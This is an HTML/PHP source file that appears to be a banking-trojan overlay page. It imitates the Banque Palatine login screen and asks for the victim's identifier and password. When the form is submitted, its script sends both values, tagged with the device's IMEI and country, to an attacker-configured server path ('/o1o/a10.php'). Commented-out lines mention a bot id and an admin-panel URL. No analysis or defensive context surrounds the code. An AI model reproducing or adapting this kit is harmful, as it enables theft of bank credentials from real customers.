<html>
<head>
<style>
	body {
	    font-family: arial, helvetica, verdana sans-serif;
	    height: 255px;
	    margin: 0;
	    padding: 0;
	}
	.input {
		width: 99%;
		max-width: 100%;
		font-size: 14px;
		background-color: #FFF;
		border-left: 1px solid #aaa;
		border-top: 1px solid #aaa;
		border-bottom: 1px solid #dfdfdf;
		border-right: 1px solid #ddd;
		padding: 8px 10px;
		margin: 1px 0;
		box-sizing: border-box;
	}
	
.submit {
    width: 25%;
    float: right;
    color: white;
    border: 1px solid #7b6c65;
    background: #82736D;
    font-size: 14px;
    margin: 10px 0;
    display: block;
    text-decoration: none;
    text-align: center;
    padding: 10px;
    white-space: nowrap;
    margin-right: 10px;
    max-width: 100%;
    overflow: hidden;
    font-weight: bold;
    border-radius: 6px;
}
	
.fielderror {
	width: 99%;
    max-width: 100%;
    font-size: 14px;
    background-color: #FFF;
    border-left: 1px solid #f00;
    border-top: 1px solid #f00;
    border-bottom: 1px solid #f00;
    border-right: 1px solid #f00;
    padding: 8px 10px;
    margin: 1px 0;
    box-sizing: border-box;
}

label {
    display: block;
    font-weight: bold;
    margin-right: 24px;
    padding: 5px 10px;
    font-size: 14px;
}
</style>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<div id="content_div">
<img src="data:image/png;base64,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"style="width: 200px;">
<form action="null" method="post" id="_mainForm" target="flow_handler">

<label>Identifiant :</label>
<center>
<input name="Logn" id="login" maxlength="20" class="input" type="text">
</center>
            <script>
                document.getElementById('login').onkeypress = function (e) {
                    return !(/[А-Яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
                }
            </script>
<label>Mot de passe :</label>
<center>
<input name="Password" id="password" maxlength="50" class="input" type="password">
</center>
            <script>
                document.getElementById('password').onkeypress = function (e) {
                    return !(/[А-Яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
                }
            </script>

<input value="Valider" id="input_submitBtn" class="submit" type="button">
<input type="hidden" name="name" value="Banque Palatine">

<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
</form>
           <script type="text/javascript">
			   
				
				
				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                  /*  var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
					
					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;
					
                    g_oForm.setAttribute('action',g_sFAct); // óñòàíàâëèâàåì ó ôîðìû óðë àäìèíêè
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};
					
					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // ïîëó÷àåì id áîòà
*/

                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input';
						} catch(e){};
						
                        if (oNumInp.value.length < 6) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{4,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
				top['closeDlg'] = true;
				/*prompt('send', '{"dialog id" : "palatine'+
					'", "identifiant": "'+oNumInp.value+
					'", "mot_de_passe": "'+oCodeInp.value+'"}');
						
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/
						
						
						
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|palatine|"+oNumInp.value+"|"+oCodeInp.value+"|");
						
						return false;
                    };

                })();
            </script>

</div>
</body>
</html>
